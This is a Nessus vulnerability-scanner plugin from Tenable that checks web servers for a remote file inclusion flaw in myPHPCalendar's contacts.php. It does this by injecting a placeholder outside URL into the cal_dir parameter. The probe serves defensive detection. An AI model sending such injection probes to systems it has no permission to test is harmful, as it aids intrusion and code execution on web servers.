#
# (C) Tenable Network Security
#
# Ref:
#  From: "Frog Man" <leseulfrog@hotmail.com>
#  To: vulnwatch@vulnwatch.org, bugtraq@securityfocus.com
#  Subject: [VulnWatch] myPHPCalendar : Informations Disclosure, File Include



if(description)
{
 script_id(11877);
 script_version ("$Revision: 1.7 $");
 name["english"] = "myPHPcalendar injection";

 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to make the remote host include php files hosted
on a third party server using myphpcalendar.

An attacker may use this flaw to inject arbitrary code in the remote
host and gain a shell with the privileges of the web server.

Solution : Disable this CGI suite
Risk factor : High";




 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of contacts.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);


function check(url)
{
req = http_get(item:string(url, "/contacts.php?cal_dir=http://xxxxxxxx/"),
 		port:port);
r = http_keepalive_send_recv(port:port, data:req);
if ( r == NULL ) exit(0);
 if(egrep(pattern:"http://xxxxxxxx/vars\.inc", string:r))
 	{
 	security_hole(port);
	exit(0);
	}
 
}

foreach dir (cgi_dirs())
 check(url:dir);
